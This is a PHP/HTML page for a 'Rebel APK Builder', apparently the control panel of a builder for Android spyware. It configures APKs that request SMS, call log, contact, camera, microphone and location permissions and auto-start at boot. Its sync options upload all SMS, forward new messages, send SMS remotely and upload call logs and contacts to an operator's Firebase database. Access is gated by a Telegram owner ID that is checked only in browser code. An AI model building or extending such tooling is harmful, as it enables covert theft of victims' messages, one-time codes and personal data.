<?php
require_once __DIR__ . '/apk_builder_lib.php';
if (!empty($_GET['api']) || !empty($_POST['api'])) {
  rebel_apk_handle_api();
  exit;
}
$OWNER = REBEL_APK_OWNER;
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Rebel APK Builder — Client APK Studio</title>
<style>
:root{--bg:#08080c;--surface:#101018;--card:#14141e;--border:#252535;--text:#eee;--muted:#888;--accent:#ff3c3c;--accent2:#7b2fff;--ok:#22c55e;--warn:#f59e0b}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
a{color:var(--accent)}
.wrap{display:grid;grid-template-columns:260px 1fr;min-height:100vh}
@media(max-width:900px){.wrap{grid-template-columns:1fr}.side{position:fixed;inset:0;z-index:50;transform:translateX(-100%);transition:.2s}.side.open{transform:none}}
.side{background:var(--surface);border-right:1px solid var(--border);padding:16px;display:flex;flex-direction:column;gap:12px}
.brand{font-size:18px;font-weight:800}.brand em{color:var(--accent);font-style:normal}
.brand-sub{font-size:11px;color:var(--muted);margin-top:2px}
.proj-list{flex:1;overflow:auto;display:flex;flex-direction:column;gap:6px}
.proj-item{padding:10px 12px;border-radius:10px;border:1px solid var(--border);background:var(--card);cursor:pointer;font-size:13px}
.proj-item.active{border-color:var(--accent);background:rgba(255,60,60,.08)}
.proj-item small{display:block;color:var(--muted);font-size:10px;margin-top:3px}
.btn{border:1px solid var(--border);background:var(--card);color:var(--text);padding:10px 14px;border-radius:10px;font-weight:700;font-size:12px;cursor:pointer}
.btn:hover{border-color:var(--accent)}
.btn.primary{background:linear-gradient(135deg,var(--accent),#aa0000);border:none;color:#fff}
.btn.purple{background:linear-gradient(135deg,var(--accent2),#4400aa);border:none;color:#fff}
.main{padding:20px 24px 40px;overflow:auto}
.topbar{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px;flex-wrap:wrap}
.tabs{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:18px}
.tab{padding:8px 14px;border-radius:999px;border:1px solid var(--border);background:var(--card);font-size:12px;cursor:pointer;color:var(--muted)}
.tab.active{background:rgba(255,60,60,.15);border-color:var(--accent);color:#fff}
.panel{display:none}.panel.active{display:block}
.card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:18px;margin-bottom:14px}
.card h3{font-size:14px;margin-bottom:12px;display:flex;align-items:center;gap:8px}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
@media(max-width:700px){.grid2{grid-template-columns:1fr}}
label{display:block;font-size:11px;color:var(--muted);margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px}
input,select,textarea{width:100%;padding:10px 12px;border-radius:10px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:13px}
textarea{min-height:90px;resize:vertical;font-family:ui-monospace,monospace;font-size:11px}
.chk-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}
.chk{display:flex;align-items:center;gap:8px;padding:8px 10px;border:1px solid var(--border);border-radius:10px;font-size:12px;cursor:pointer}
.chk input{accent-color:var(--accent);width:auto}
.chk.on{border-color:rgba(34,197,94,.4);background:rgba(34,197,94,.06)}
.color-row{display:flex;gap:8px;align-items:center}
.color-row input[type=color]{width:44px;height:36px;padding:2px;border:none;background:none}
.btn-row{display:flex;gap:8px;flex-wrap:wrap;margin-top:14px}
.preview-box{background:#0a0a12;border:1px solid var(--border);border-radius:10px;padding:12px;max-height:280px;overflow:auto;font-family:ui-monospace,monospace;font-size:10px;white-space:pre-wrap;color:#9cf}
.landing-preview{border-radius:14px;overflow:hidden;border:1px solid var(--border);min-height:320px}
.landing-preview iframe{width:100%;height:360px;border:0;background:#000}
.btn-list{display:flex;flex-direction:column;gap:8px}
.btn-row-item{display:grid;grid-template-columns:1fr 1fr 100px 36px;gap:8px;align-items:end}
.toast{position:fixed;bottom:20px;right:20px;padding:12px 18px;border-radius:10px;background:var(--card);border:1px solid var(--border);font-size:13px;z-index:99;animation:fade .2s}
@keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1}}
#loginGate{position:fixed;inset:0;background:var(--bg);display:flex;align-items:center;justify-content:center;z-index:100}
.login-box{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:28px;max-width:380px;width:92%}
.hint{font-size:11px;color:var(--muted);margin-top:6px}
.logo-preview{width:72px;height:72px;border-radius:16px;border:1px dashed var(--border);display:flex;align-items:center;justify-content:center;font-size:36px;overflow:hidden;background:var(--surface)}
.logo-preview img{width:100%;height:100%;object-fit:cover}
.mobile-menu{display:none}
@media(max-width:900px){.mobile-menu{display:inline-flex}}
</style>
</head>
<body>
<div id="loginGate">
  <div class="login-box">
    <div class="brand">Rebel <em>APK</em> Builder</div>
    <p class="hint" style="margin:12px 0 18px">Advanced client APK studio — permissions, Firebase, UI, sync control.</p>
    <label>Owner Access Key</label>
    <input id="ownerKey" type="password" placeholder="Enter owner ID" autocomplete="off"/>
    <div class="btn-row"><button class="btn primary" style="flex:1" onclick="doLogin()">Enter Studio</button></div>
    <p class="hint">Use your Rebel owner Telegram ID.</p>
  </div>
</div>
<div class="wrap" id="app" style="display:none">
  <aside class="side" id="side">
    <div class="brand">Rebel <em>APK</em> Builder</div>
    <div class="brand-sub">Client APK Studio</div>
    <button class="btn primary" onclick="newProject()">+ New Project</button>
    <div class="proj-list" id="projList"></div>
    <a href="sex.php" class="hint">← Back to Rebel Panel</a>
  </aside>
  <main class="main">
    <div class="topbar">
      <div>
        <button class="btn mobile-menu" onclick="document.getElementById('side').classList.toggle('open')">☰</button>
        <strong id="projTitle">New Project</strong>
        <div class="hint" id="projMeta">Configure your client APK</div>
      </div>
      <div class="btn-row" style="margin:0">
        <button class="btn" onclick="saveProject()">💾 Save</button>
        <button class="btn" onclick="previewProject()">👁 Preview</button>
        <button class="btn purple" onclick="exportZip()">📦 Export Build Pack</button>
      </div>
    </div>
    <div class="tabs" id="tabs"></div>

    <div class="panel active" data-panel="basics">
      <div class="card"><h3>📱 App Identity</h3>
        <div class="grid2">
          <div><label>Project Name</label><input id="f_name" oninput="syncField('name',this.value)"/></div>
          <div><label>App Display Name</label><input id="f_app_name" oninput="syncField('app.name',this.value)"/></div>
          <div><label>Package Name (applicationId)</label><input id="f_package" oninput="syncField('app.package',this.value)" placeholder="com.client.myapp"/></div>
          <div><label>Version</label><div class="grid2"><input id="f_ver_name" oninput="syncField('app.version_name',this.value)"/><input id="f_ver_code" type="number" min="1" oninput="syncField('app.version_code',parseInt(this.value)||1)"/></div></div>
        </div>
      </div>
      <div class="card"><h3>🎨 Logo & Branding</h3>
        <div style="display:flex;gap:16px;align-items:center;flex-wrap:wrap">
          <div class="logo-preview" id="logoPreview">📱</div>
          <div style="flex:1;min-width:200px">
            <label>Logo Emoji (landing page)</label><input id="f_logo_emoji" oninput="syncField('ui.logo_emoji',this.value)"/>
            <label style="margin-top:10px">Upload Logo PNG (512×512)</label><input type="file" accept="image/png,image/jpeg,image/webp" onchange="uploadLogo(this)"/>
          </div>
        </div>
      </div>
    </div>

    <div class="panel" data-panel="firebase">
      <div class="card"><h3>🔥 Firebase / google-services.json</h3>
        <p class="hint" style="margin-bottom:12px">Paste full google-services.json OR fill fields manually.</p>
        <label>Upload google-services.json</label>
        <input type="file" accept=".json,application/json" onchange="parseGsFile(this)"/>
        <div class="grid2" style="margin-top:12px">
          <div><label>Project ID</label><input id="f_fb_pid" oninput="syncField('firebase.project_id',this.value)"/></div>
          <div><label>Project Number</label><input id="f_fb_pnum" oninput="syncField('firebase.project_number',this.value)"/></div>
          <div><label>API Key</label><input id="f_fb_key" oninput="syncField('firebase.api_key',this.value)"/></div>
          <div><label>App ID (mobilesdk_app_id)</label><input id="f_fb_appid" oninput="syncField('firebase.app_id',this.value)"/></div>
          <div><label>Storage Bucket</label><input id="f_fb_bucket" oninput="syncField('firebase.storage_bucket',this.value)"/></div>
          <div><label>Database URL</label><input id="f_fb_db" oninput="syncField('firebase.database_url',this.value)" placeholder="https://xxx.firebasedatabase.app"/></div>
        </div>
      </div>
      <div class="card"><h3>📡 Firebase Nodes</h3>
        <div class="grid2">
          <div><label>Device Root</label><input id="f_node_dev" oninput="syncField('nodes.device_root',this.value)"/></div>
          <div><label>Status Root</label><input id="f_node_st" oninput="syncField('nodes.status_root',this.value)"/></div>
          <div><label>Clients Root</label><input id="f_node_cl" oninput="syncField('nodes.clients_root',this.value)"/></div>
        </div>
      </div>
    </div>

    <div class="panel" data-panel="permissions">
      <div class="card"><h3>🔐 Android Permissions</h3>
        <p class="hint" style="margin-bottom:12px">Toggle what the APK requests at install/runtime. Disabled = not in manifest.</p>
        <div class="chk-grid" id="permGrid"></div>
      </div>
    </div>

    <div class="panel" data-panel="sync">
      <div class="card"><h3>☁️ Firebase Sync — What Gets Sent</h3>
        <p class="hint" style="margin-bottom:12px">Control exactly which data syncs to Realtime Database. Off = APK won't upload that data.</p>
        <div class="chk-grid" id="syncGrid"></div>
      </div>
    </div>

    <div class="panel" data-panel="ui">
      <div class="card"><h3>🎨 App UI & First Page</h3>
        <div class="grid2">
          <div><label>WebView URL (main panel)</label><input id="f_webview" oninput="syncField('app.webview_url',this.value)"/></div>
          <div><label>Allowed Domain</label><input id="f_domain" oninput="syncField('app.allowed_domain',this.value)"/></div>
          <div><label>Landing Title</label><input id="f_splash_title" oninput="syncField('ui.splash_title',this.value)"/></div>
          <div><label>Landing Subtitle</label><input id="f_splash_sub" oninput="syncField('ui.splash_subtitle',this.value)"/></div>
        </div>
        <div class="grid2" style="margin-top:12px">
          <div><label>Primary Color</label><div class="color-row"><input type="color" id="f_c_primary" oninput="syncColor('ui.primary_color',this.value)"/><input id="f_c_primary_t" oninput="syncField('ui.primary_color',this.value)"/></div></div>
          <div><label>Accent Color</label><div class="color-row"><input type="color" id="f_c_accent" oninput="syncColor('ui.accent_color',this.value)"/><input id="f_c_accent_t" oninput="syncField('ui.accent_color',this.value)"/></div></div>
          <div><label>Background</label><div class="color-row"><input type="color" id="f_c_bg" oninput="syncColor('ui.background_color',this.value)"/><input id="f_c_bg_t" oninput="syncField('ui.background_color',this.value)"/></div></div>
        </div>
        <label style="margin-top:14px"><input type="checkbox" id="f_use_landing" onchange="syncField('ui.use_landing_page',this.checked)"/> Show native landing page before WebView</label>
      </div>
      <div class="card"><h3>🔘 Landing Page Buttons</h3>
        <div class="btn-list" id="btnList"></div>
        <button class="btn" style="margin-top:10px" onclick="addHomeButton()">+ Add Button</button>
      </div>
      <div class="card"><h3>📲 Landing Preview</h3>
        <div class="landing-preview"><iframe id="landingFrame" sandbox="allow-scripts"></iframe></div>
      </div>
    </div>

    <div class="panel" data-panel="export">
      <div class="card"><h3>📦 Build Pack Export</h3>
        <p class="hint">Export ZIP contains google-services.json, apk_config.json, AndroidManifest.xml, landing.html, colors, strings, and build instructions.</p>
        <div class="btn-row">
          <button class="btn purple" onclick="exportZip()">Download ZIP</button>
          <button class="btn" onclick="previewProject()">Refresh Preview</button>
        </div>
      </div>
      <div class="card"><h3>google-services.json preview</h3><div class="preview-box" id="gsPreview">Save or preview to see output</div></div>
      <div class="card"><h3>apk_config.json preview</h3><div class="preview-box" id="cfgPreview"></div></div>
    </div>
  </main>
</div>
<script>
var OWNER='<?php echo htmlspecialchars($OWNER, ENT_QUOTES); ?>';
var API='apk_builder.php?api=1&owner='+OWNER;
var cfg=null;
var TAB_NAMES=[['basics','📱 Basics'],['firebase','🔥 Firebase'],['permissions','🔐 Permissions'],['sync','☁️ Sync'],['ui','🎨 UI Design'],['export','📦 Export']];

var PERM_LABELS={
  internet:'Internet',network_state:'Network State',foreground_service:'Foreground Service',
  foreground_service_data_sync:'FG Data Sync',boot_completed:'Boot Auto-Start',wake_lock:'Wake Lock',
  post_notifications:'Notifications',send_sms:'Send SMS',receive_sms:'Receive SMS',read_sms:'Read SMS',
  read_call_log:'Call Log',read_contacts:'Contacts',call_phone:'Call Phone',read_phone_state:'Phone State',
  camera:'Camera',record_audio:'Microphone',fine_location:'Location'
};
var SYNC_LABELS={
  online_status:'Online Status',device_info:'Device Info',live_data:'Live Data (heartbeat)',
  all_sms:'All SMS Upload',new_sms:'Live New SMS',all_calls:'Call Log Upload',all_contacts:'Contacts Upload',
  devices_status:'devices_status Node',clients_node:'clients Node',sms_forwarding:'SMS Forwarding',
  manual_send_sms:'Remote Send SMS',sim_info:'SIM Info',permissions_status:'Permission Status'
};

function toast(m,ok){var t=document.createElement('div');t.className='toast';t.textContent=m;t.style.borderColor=ok?'var(--ok)':'var(--accent)';document.body.appendChild(t);setTimeout(function(){t.remove();},2800);}
function doLogin(){
  var k=document.getElementById('ownerKey').value.trim();
  if(k!==OWNER){toast('Wrong owner key',false);return;}
  localStorage.setItem('rebel_apk_owner',k);
  document.getElementById('loginGate').style.display='none';
  document.getElementById('app').style.display='';
  boot();
}
if(localStorage.getItem('rebel_apk_owner')===OWNER){document.getElementById('loginGate').style.display='none';document.getElementById('app').style.display='';}

function api(action,opts){
  opts=opts||{};
  var url=API+'&action='+encodeURIComponent(action);
  return fetch(url,Object.assign({headers:{'Content-Type':'application/json'}},opts)).then(function(r){
    if(action==='export') return r;
    return r.json();
  });
}
function setPath(obj,path,val){
  var p=path.split('.'),o=obj;
  for(var i=0;i<p.length-1;i++){if(!o[p[i]])o[p[i]]={};o=o[p[i]];}
  o[p[p.length-1]]=val;
}
function getPath(obj,path){
  return path.split('.').reduce(function(a,k){return a&&a[k]!=null?a[k]:'';},obj);
}
function syncField(path,val){setPath(cfg,path,val);if(path==='name')document.getElementById('projTitle').textContent=val||'New Project';updateLandingPreviewDebounced();}
function syncColor(path,val){syncField(path,val);var id=path==='ui.primary_color'?'f_c_primary_t':path==='ui.accent_color'?'f_c_accent_t':'f_c_bg_t';document.getElementById(id).value=val;updateLandingPreviewDebounced();}

function newProject(){
  return api('list').then(function(d){
    cfg=JSON.parse(JSON.stringify(d.defaults));
    cfg.id='';
    fillForm();
    renderProjects(d.projects);
    toast('New project ready',true);
  });
}
function loadProject(id){
  return api('load&id='+encodeURIComponent(id)).then(function(d){
    if(!d.ok)return toast(d.error||'Load failed',false);
    cfg=d.project;fillForm();toast('Loaded',true);
  });
}
function saveProject(){
  return api('save',{method:'POST',body:JSON.stringify(cfg)}).then(function(d){
    if(!d.ok)return toast(d.error||'Save failed',false);
    cfg=d.project;fillForm();renderProjectList();toast('Saved ✓',true);
  });
}
function previewProject(){
  return api('preview',{method:'POST',body:JSON.stringify(cfg)}).then(function(d){
    if(!d.ok)return toast(d.error||'Preview failed',false);
    document.getElementById('gsPreview').textContent=JSON.stringify(d.google_services,null,2);
    document.getElementById('cfgPreview').textContent=JSON.stringify(d.apk_config,null,2);
    var frame=document.getElementById('landingFrame');
    frame.srcdoc=d.landing_preview;
    toast('Preview updated',true);
  });
}
function exportZip(){
  saveProject().then(function(){
    window.location.href=API+'&action=export&id='+encodeURIComponent(cfg.id);
  });
}
function parseGsFile(inp){
  var f=inp.files[0];if(!f)return;
  var r=new FileReader();
  r.onload=function(){
    api('parse_gs',{method:'POST',body:r.result}).then(function(d){
      if(!d.ok)return toast('Parse failed',false);
      var fb=d.firebase;
      if(fb.project_id)cfg.firebase.project_id=fb.project_id;
      if(fb.project_number)cfg.firebase.project_number=fb.project_number;
      if(fb.api_key)cfg.firebase.api_key=fb.api_key;
      if(fb.app_id)cfg.firebase.app_id=fb.app_id;
      if(fb.storage_bucket)cfg.firebase.storage_bucket=fb.storage_bucket;
      if(fb.package_name)cfg.app.package=fb.package_name;
      fillForm();toast('google-services.json imported',true);
    });
  };
  r.readAsText(f);
}
function uploadLogo(inp){
  if(!cfg.id){toast('Save project first',false);return;}
  var fd=new FormData();fd.append('logo',inp.files[0]);fd.append('id',cfg.id);fd.append('api','1');fd.append('owner',OWNER);fd.append('action','upload_logo');
  fetch('apk_builder.php',{method:'POST',body:fd}).then(function(r){return r.json();}).then(function(d){
    if(!d.ok)return toast(d.error||'Upload failed',false);
    document.getElementById('logoPreview').innerHTML='<img src="data/apk_projects/'+cfg.id+'_logo.png?t='+Date.now()+'"/>';
    toast('Logo uploaded',true);
  });
}
function addHomeButton(){
  cfg.ui.home_buttons=cfg.ui.home_buttons||[];
  cfg.ui.home_buttons.push({label:'New Button',url:'https://',style:'primary'});
  renderButtons();updateLandingPreviewDebounced();
}
function renderButtons(){
  var el=document.getElementById('btnList');el.innerHTML='';
  (cfg.ui.home_buttons||[]).forEach(function(b,i){
    var row=document.createElement('div');row.className='btn-row-item';
    row.innerHTML='<div><label>Label</label><input value="'+esc(b.label)+'" onchange="setBtn('+i+',\'label\',this.value)"/></div>'+
      '<div><label>URL / action:refresh</label><input value="'+esc(b.url)+'" onchange="setBtn('+i+',\'url\',this.value)"/></div>'+
      '<div><label>Style</label><select onchange="setBtn('+i+',\'style\',this.value)"><option value="primary"'+(b.style==='primary'?' selected':'')+'>Primary</option><option value="secondary"'+(b.style==='secondary'?' selected':'')+'>Secondary</option></select></div>'+
      '<button class="btn" onclick="rmBtn('+i+')">✕</button>';
    el.appendChild(row);
  });
}
function setBtn(i,k,v){cfg.ui.home_buttons[i][k]=v;updateLandingPreviewDebounced();}
function rmBtn(i){cfg.ui.home_buttons.splice(i,1);renderButtons();updateLandingPreviewDebounced();}
function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;');}

function renderPermSync(){
  var pg=document.getElementById('permGrid');pg.innerHTML='';
  Object.keys(PERM_LABELS).forEach(function(k){
    var on=!!cfg.permissions[k];
    var d=document.createElement('label');d.className='chk'+(on?' on':'');
    d.innerHTML='<input type="checkbox"'+(on?' checked':'')+' onchange="togglePerm(\''+k+'\',this)"/> '+PERM_LABELS[k];
    pg.appendChild(d);
  });
  var sg=document.getElementById('syncGrid');sg.innerHTML='';
  Object.keys(SYNC_LABELS).forEach(function(k){
    var on=!!cfg.sync[k];
    var d=document.createElement('label');d.className='chk'+(on?' on':'');
    d.innerHTML='<input type="checkbox"'+(on?' checked':'')+' onchange="toggleSync(\''+k+'\',this)"/> '+SYNC_LABELS[k];
    sg.appendChild(d);
  });
}
function togglePerm(k,el){cfg.permissions[k]=el.checked;el.parentElement.classList.toggle('on',el.checked);}
function toggleSync(k,el){cfg.sync[k]=el.checked;el.parentElement.classList.toggle('on',el.checked);}

function fillForm(){
  document.getElementById('projTitle').textContent=cfg.name||'New Project';
  document.getElementById('projMeta').textContent=(cfg.app.package||'')+' · v'+(cfg.app.version_name||'1.0');
  document.getElementById('f_name').value=cfg.name||'';
  document.getElementById('f_app_name').value=cfg.app.name||'';
  document.getElementById('f_package').value=cfg.app.package||'';
  document.getElementById('f_ver_name').value=cfg.app.version_name||'';
  document.getElementById('f_ver_code').value=cfg.app.version_code||1;
  document.getElementById('f_logo_emoji').value=cfg.ui.logo_emoji||'📱';
  document.getElementById('logoPreview').textContent=cfg.ui.logo_emoji||'📱';
  document.getElementById('f_fb_pid').value=cfg.firebase.project_id||'';
  document.getElementById('f_fb_pnum').value=cfg.firebase.project_number||'';
  document.getElementById('f_fb_key').value=cfg.firebase.api_key||'';
  document.getElementById('f_fb_appid').value=cfg.firebase.app_id||'';
  document.getElementById('f_fb_bucket').value=cfg.firebase.storage_bucket||'';
  document.getElementById('f_fb_db').value=cfg.firebase.database_url||'';
  document.getElementById('f_node_dev').value=cfg.nodes.device_root||'devices';
  document.getElementById('f_node_st').value=cfg.nodes.status_root||'devices_status';
  document.getElementById('f_node_cl').value=cfg.nodes.clients_root||'clients';
  document.getElementById('f_webview').value=cfg.app.webview_url||'';
  document.getElementById('f_domain').value=cfg.app.allowed_domain||'';
  document.getElementById('f_splash_title').value=cfg.ui.splash_title||'';
  document.getElementById('f_splash_sub').value=cfg.ui.splash_subtitle||'';
  document.getElementById('f_use_landing').checked=!!cfg.ui.use_landing_page;
  ['primary','accent','bg'].forEach(function(k){
    var path='ui.'+k+'_color';var val=getPath(cfg,path)||'#000';
    document.getElementById('f_c_'+k).value=val;
    document.getElementById('f_c_'+k+'_t').value=val;
  });
  renderPermSync();renderButtons();updateLandingPreviewDebounced();
}
function renderProjects(list){
  var el=document.getElementById('projList');el.innerHTML='';
  (list||[]).forEach(function(p){
    var d=document.createElement('div');d.className='proj-item'+(cfg&&cfg.id===p.id?' active':'');
    d.innerHTML='<b>'+esc(p.name)+'</b><small>'+esc(p.package)+'</small>';
    d.onclick=function(){loadProject(p.id);document.getElementById('side').classList.remove('open');};
    el.appendChild(d);
  });
}
function renderProjectList(){api('list').then(function(d){if(d.ok)renderProjects(d.projects);});}
var _landTimer=0;
function updateLandingPreviewDebounced(){clearTimeout(_landTimer);_landTimer=setTimeout(function(){if(cfg)previewProject();},600);}

function boot(){
  var tabs=document.getElementById('tabs');
  TAB_NAMES.forEach(function(t){
    var b=document.createElement('button');b.className='tab';b.textContent=t[1];b.dataset.tab=t[0];
    b.onclick=function(){
      document.querySelectorAll('.tab').forEach(function(x){x.classList.remove('active');});
      document.querySelectorAll('.panel').forEach(function(x){x.classList.remove('active');});
      b.classList.add('active');
      document.querySelector('[data-panel="'+t[0]+'"]').classList.add('active');
    };
    tabs.appendChild(b);
  });
  tabs.firstChild.classList.add('active');
  api('list').then(function(d){
    if(!d.ok)return newProject();
    cfg=JSON.parse(JSON.stringify(d.defaults));
    if(d.projects.length)loadProject(d.projects[0].id);
    else fillForm();
    renderProjects(d.projects);
  });
}
if(localStorage.getItem('rebel_apk_owner')===OWNER)boot();
</script>
</body>
</html>
